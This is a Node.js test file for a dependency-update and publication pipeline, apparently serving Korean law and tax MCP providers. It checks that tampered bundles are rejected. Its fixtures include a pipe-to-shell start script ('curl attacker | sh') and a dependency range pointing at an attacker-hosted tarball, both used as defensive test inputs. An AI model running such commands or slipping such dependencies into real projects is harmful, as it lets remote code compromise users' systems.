import test from 'node:test';
import assert from 'node:assert/strict';
import {readFile} from 'node:fs/promises';
import {execFile} from 'node:child_process';
import {promisify} from 'node:util';
import {compareVersion, lawCandidate, taxCandidate, updateFiles, documentCandidates} from '../scripts/prepare-provider-update.mjs';
import {validateBundle,verifyRegistryPins,dispatchReviewedDeployment} from '../scripts/publish-provider-update.mjs';
import {readAutomation} from '../scripts/run-upstream-watch.mjs';
import {prepareEmail} from '../scripts/upstream-email-report.mjs';
test('providers: release comparison rejects prerelease and supports post revisions',()=>{
  assert.ok(compareVersion('2.1.0.post2','2.1.0.post1')>0);
  assert.ok(compareVersion('2.2.0','2.1.0.post99')>0);
  assert.equal(lawCandidate({name:'korean-law-mcp',version:'4.15.6'},'4.15.6'),null);
  assert.throws(()=>lawCandidate({name:'korean-law-mcp',version:'5.0.0-beta'},'4.15.6'));
});
test('providers: moved tax tag is not accepted as an existing version',()=>{
  const release={tag_name:'taxlab-v2.1.0.post1',draft:false,prerelease:false};
  const ref={ref:'refs/tags/'+release.tag_name,object:{type:'commit',sha:'b'.repeat(40)}};
  const metadata={fork:{version:'2.1.0.post1',repository:'hyunae52/korean-taxlaw-mcp'},upstream:{repository:'zisu17/korean-taxlaw-mcp'}};
  assert.throws(()=>taxCandidate(release,ref,metadata,{version:'2.1.0.post1',commit:'a'.repeat(40)}),/TAG_MOVED/);
});

const parserMetadata = (pin, range = '^4.6.7') => ({name:'kordoc',version:pin.version,gitHead:pin.commit,
  repository:{url:'git+https://github.com/chrisryugj/kordoc.git'},license:'MIT',
  dist:{integrity:pin.integrity},dependencies:{zod:range}});
test('providers: parser-only and compatible Zod-only releases update without a law release',()=>{
  const pin={package:'kordoc',repository:'chrisryugj/kordoc',license:'MIT',version:'4.21.31',commit:'a'.repeat(40),integrity:'sha512-YWJjZA=='};
  const pkg={dependencies:{'korean-law-mcp':'4.15.14',kordoc:pin.version,zod:'4.6.7'}};
  const metadata=parserMetadata({...pin,version:'4.24.11',commit:'b'.repeat(40)});
  const versions=['3.25.76','4.6.7','4.6.9','4.7.0-beta.1','5.0.0'];
  const next=documentCandidates(metadata,pkg,pin,versions);
  assert.equal(next.kordoc,'4.24.11');assert.equal(next.zod,'4.6.9');assert.equal(next.changed,true);
  const current={dependencies:{...pkg.dependencies,kordoc:next.kordoc}};
  assert.equal(documentCandidates(metadata,current,next.parser,versions).changed,true);
  current.dependencies.zod=next.zod;
  assert.equal(documentCandidates(metadata,current,next.parser,versions).changed,false);
  assert.equal(documentCandidates({...metadata,dependencies:{zod:'>=4.6.7 <4.6.9'}},pkg,pin,versions).zod,'4.6.7');
  assert.throws(()=>documentCandidates({...metadata,dependencies:{zod:'^3.25.0'}},pkg,pin,versions),/ZOD_DOWNGRADE_REQUIRED/);
  assert.throws(()=>documentCandidates({...metadata,dependencies:{zod:'^6.0.0'}},pkg,pin,versions),/NO_COMPATIBLE_ZOD/);
  assert.throws(()=>documentCandidates({...metadata,dependencies:{zod:'https://attacker/zod.tgz'}},pkg,pin,versions),/INVALID_KORDOC_ZOD_RANGE/);
  assert.throws(()=>documentCandidates({...metadata,version:pin.version},pkg,pin,versions),/PARSER_VERSION_REUSED/);
});

async function publicationFixture() {
  const original=Object.fromEntries(await Promise.all(updateFiles.map(async p=>[p,await readFile(p,'utf8')])));
  const pkg=JSON.parse(original['package.json']);
  const good={schema_version:2,base:'a'.repeat(40),changed:true,law:pkg.dependencies['korean-law-mcp'],
    kordoc:pkg.dependencies.kordoc,zod:pkg.dependencies.zod,
    tax:JSON.parse(original[updateFiles[3]]),files:{[updateFiles[4]]:original[updateFiles[4]]}};
  return {original,pkg,good};
}
test('providers: trusted publication limits executable changes to pinned dependencies',async()=>{
  const {original,pkg,good}=await publicationFixture();
  validateBundle(good,original);
  assert.throws(()=>validateBundle({...good,files:{'src/app.ts':'arbitrary code'}},original));
  const bad=structuredClone(pkg);bad.scripts.start='curl attacker | sh';
  assert.throws(()=>validateBundle({...good,files:{'package.json':JSON.stringify(bad)}},original),/ONLY_PROVIDER/);
  const pin={...good.tax,commit:'b'.repeat(40)};
  pin.archive_url=`https://codeload.github.com/${pin.repository}/zip/${pin.commit}`;
  assert.throws(()=>validateBundle({...good,tax:pin,files:{[updateFiles[3]]:JSON.stringify(pin)}},original),/RELEASE_VERSION_REUSED/);
});

test('providers: publication checks parser identity, compatible Zod, lock parity and registry provenance',async()=>{
  const {original,pkg,good}=await publicationFixture();
  const oldParser=JSON.parse(original['upstreams/document-parser.json']);
  const lock=JSON.parse(original['npm-shrinkwrap.json']);
  const bump=version=>{const parts=version.split('.').map(Number);parts[2]++;return parts.join('.');};
  const make=(parserVersion,zodVersion)=>{
    const candidate=structuredClone(good),nextPkg=structuredClone(pkg),nextLock=structuredClone(lock);
    candidate.kordoc=nextPkg.dependencies.kordoc=parserVersion;
    candidate.zod=nextPkg.dependencies.zod=zodVersion;
    nextLock.packages[''].dependencies={...nextPkg.dependencies};
    nextLock.packages['node_modules/kordoc'].version=parserVersion;
    nextLock.packages['node_modules/zod'].version=zodVersion;
    const parser={...oldParser,version:parserVersion,commit:parserVersion===oldParser.version?oldParser.commit:'b'.repeat(40)};
    candidate.files={...candidate.files,'package.json':JSON.stringify(nextPkg),'package-lock.json':JSON.stringify(nextLock),
      'npm-shrinkwrap.json':JSON.stringify(nextLock),'upstreams/document-parser.json':JSON.stringify(parser)};
    return candidate;
  };
  const next=make(bump(good.kordoc),bump(good.zod));
  validateBundle(next,original);
  validateBundle(make(good.kordoc,bump(good.zod)),original);
  const request=async url=>url.includes('/kordoc/')
    ?parserMetadata(JSON.parse(next.files['upstreams/document-parser.json']),lock.packages['node_modules/kordoc'].dependencies.zod)
    :{name:'zod',version:next.zod,dist:{integrity:lock.packages['node_modules/zod'].integrity}};
  await verifyRegistryPins(next,original,request);
  await assert.rejects(verifyRegistryPins(next,original,async url=>{
    const metadata=await request(url);if(metadata.name==='kordoc')metadata.gitHead='c'.repeat(40);return metadata;
  }),/PARSER_VERSION_REUSED/);
  await assert.rejects(verifyRegistryPins(next,original,async url=>{
    const metadata=await request(url);if(metadata.name==='kordoc')metadata.dependencies.zod='^3.25.0';return metadata;
  }),/ZOD_RANGE_REGISTRY_MISMATCH/);
  assert.throws(()=>validateBundle(make(good.kordoc,'5.0.0'),original),/ZOD_INCOMPATIBLE/);
  assert.throws(()=>validateBundle(make(good.kordoc,'3.25.76'),original),/DEPENDENCY_DOWNGRADE/);
  const badPin={...oldParser,commit:'c'.repeat(40)};
  assert.throws(()=>validateBundle({...good,files:{'upstreams/document-parser.json':JSON.stringify(badPin)}},original),/PARSER_VERSION_REUSED/);
  badPin.commit=oldParser.commit;badPin.pdf_engine={package:'attacker',version:'1.0.0'};
  assert.throws(()=>validateBundle({...good,files:{'upstreams/document-parser.json':JSON.stringify(badPin)}},original),/ONLY_PARSER_IDENTITY/);
  const mismatched=structuredClone(next);mismatched.files['package-lock.json']=original['package-lock.json'];
  assert.throws(()=>validateBundle(mismatched,original),/LOCKFILES_DIFFER/);
});
test('providers: fixed controller version, staging, tamper and rollback regressions',async()=>{
  const result=await promisify(execFile)(process.platform==='win32'?'python':'python3',['tests/provider_updates_contract_test.py'],{timeout:20000,windowsHide:true});
  assert.match(result.stderr,/Ran 9 tests/);assert.match(result.stderr,/OK/);
});
test('providers: failed or stale automation remains visible in the daily email',async()=>{
  const automation=await readAutomation(async url=>({workflow_runs:[{id:7,created_at:'2026-10-01T00:00:00Z',status:'completed',conclusion:url.includes('deploy.yml')?'failure':'success'}]}),Date.parse('2026-10-07T00:00:00Z'));
  assert.ok(automation.every(item=>item.failed));
  const email=prepareEmail({automation},{status:'partial',checked_at:'2026-10-07T00:00:00Z'});
  assert.match(email.subject,/일부 실패/);assert.match(email.text,/36시간/);assert.match(email.text,/failure/);
});
test('providers: token-triggered review explicitly dispatches only a fresh successful main attempt',async()=>{
  const head='a'.repeat(40),calls=[];let queries=0;
  const record=(id,status,conclusion)=>({id,head_sha:head,head_branch:'main',event:'workflow_dispatch',path:'.github/workflows/review.yml',run_attempt:2,status,conclusion});
  const api=async(path,method,body)=>{
    if(method==='POST'){calls.push({path,body});return null;}
    if(path==='git/ref/heads/main')return {object:{sha:head}};
    queries++;
    return {workflow_runs:queries===1?[record(1,'completed','success')]:[record(2,queries===2?'in_progress':'completed',queries===2?null:'success'),record(1,'completed','success')]};
  };
  const result=await dispatchReviewedDeployment(api,head,{sleep:async()=>{}});
  assert.equal(result.review_run_id,2);
  assert.deepEqual(calls.map(c=>c.path),['actions/workflows/review.yml/dispatches','actions/workflows/deploy.yml/dispatches']);
  assert.deepEqual(calls[1].body.inputs,{review_run_id:'2',review_attempt:'2'});
  queries=0;calls.length=0;
  await assert.rejects(dispatchReviewedDeployment(async(path,method,body)=>{
    if(method==='POST'){calls.push(path);return null;}
    if(path==='git/ref/heads/main')return {object:{sha:'b'.repeat(40)}};
    return {workflow_runs:queries++===0?[]:[record(3,'completed','success')]};
  },head,{sleep:async()=>{}}),/MAIN_MOVED/);
  assert.deepEqual(calls,['actions/workflows/review.yml/dispatches']);
});
